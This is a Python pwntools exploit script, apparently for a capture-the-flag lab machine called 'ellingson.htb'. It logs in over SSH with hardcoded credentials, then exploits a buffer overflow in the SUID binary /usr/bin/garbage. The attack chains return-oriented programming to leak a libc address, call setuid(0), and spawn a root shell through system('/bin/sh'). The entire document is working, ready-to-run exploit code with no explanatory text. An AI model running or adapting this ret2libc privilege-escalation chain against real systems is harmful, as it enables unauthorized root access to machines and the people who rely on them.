#!/usr/bin/python
from pwn import *

def leak(p,elf,libc,rop):
	POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
	LIBC_START_MAIN = elf.symbols['__libc_start_main']
	PUTS = elf.plt['puts']
	MAIN = elf.symbols['main']
	
	log.info("puts@plt: " + hex(PUTS))
	log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
	log.info("pop rdi gadget: " + hex(POP_RDI))
	
	payload = "A" * 136
	payload += p64(POP_RDI)
	payload += p64(LIBC_START_MAIN)
	payload += p64(PUTS)
	payload += p64(MAIN)

	p.recvuntil('password:')
	p.sendline(payload)
	p.recvline()
	p.recvline()
	leak = p.recvline().strip()
	leak = u64(leak.ljust(8, "\x00"))

	log.success("Leaked __libc_start_main: " + hex(leak))
	return leak

def suid(p,elf,libc,rop):
	POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
	SUID = libc.sym['setuid']
	MAIN = elf.symbols['main']

	payload = "A" * 136
	payload += p64(POP_RDI)
	payload += p64(0)
	payload += p64(SUID)
	payload += p64(MAIN)
	p.recvuntil('password:')
	p.sendline(payload)

def shell(p,elf,libc,rop):
	RET = rop.find_gadget(['ret'])[0]
	POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
	BIN_SH = next(libc.search("/bin/sh"))
	SYSTEM = libc.sym["system"]

	log.success("/bin/sh: " + hex(BIN_SH))
	log.success("system: " + hex(SYSTEM))

	payload = "A" * 136
	payload += p64(RET)
	payload += p64(POP_RDI)
	payload += p64(BIN_SH)
	payload += p64(SYSTEM)

	p.recvuntil('password:')
	p.sendline(payload)
	p.interactive()

r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')

elf = ELF("./garbage")
libc = ELF("./libc.so.6")
rop = ROP(elf)

leak = leak(p,elf,libc,rop)
libc.address = leak - libc.sym["__libc_start_main"]

log.info("Calculated libc address: " + hex(libc.address))
log.info("Setting uid to 0")

suid(p,elf,libc,rop)
shell(p,elf,libc,rop)
